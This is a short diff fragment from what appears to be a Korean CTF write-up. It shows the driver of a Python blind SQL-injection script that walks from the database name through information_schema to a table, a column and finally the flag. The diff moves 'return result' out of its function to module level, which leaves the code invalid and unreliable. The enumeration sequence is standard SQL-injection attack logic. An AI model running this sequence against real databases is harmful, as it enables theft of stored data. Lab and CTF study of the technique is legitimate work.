@@ -338,22 +338,22 @@ def dump_data(sql: str) -> str:
                 break
         else:
             break
-    return result
+return result
 
-if __name__ == "__main__":
-    print("DB: ")
-    db = dump_data("database()")
-    print("\n")
-    print("Table: ")
-    table = dump_data(f"select table_name from information_schema.tables where table_schema='{db}' limit 0,1")
-    print("\n")
-    print("Column:")
-    col = dump_data(f"select column_name from information_schema.columns where table_name='{table}' limit 0,1")
-    print("\n")
-    print("Flag:")
-    flag = dump_data(f"select {col} from {table} limit 0,1")
-    print("\n")
-    print(f"Flag → {flag}")
+
+print("DB: ")
+db = dump_data("database()")
+print("\n")
+print("Table: ")
+table = dump_data(f"select table_name from information_schema.tables where table_schema='{db}' limit 0,1")
+print("\n")
+print("Column:")
+col = dump_data(f"select column_name from information_schema.columns where table_name='{table}' limit 0,1")
+print("\n")
+print("Flag:")
+flag = dump_data(f"select {col} from {table} limit 0,1")
+print("\n")
+print(f"Flag → {flag}")
 ```
 
 - 이를 활용하여 데이터베이스 이름부터 테이블, 컬럼, 최종 데이터까지 **순차적으로 자동 추출하는 Python 스크립트**를 작성하였다.
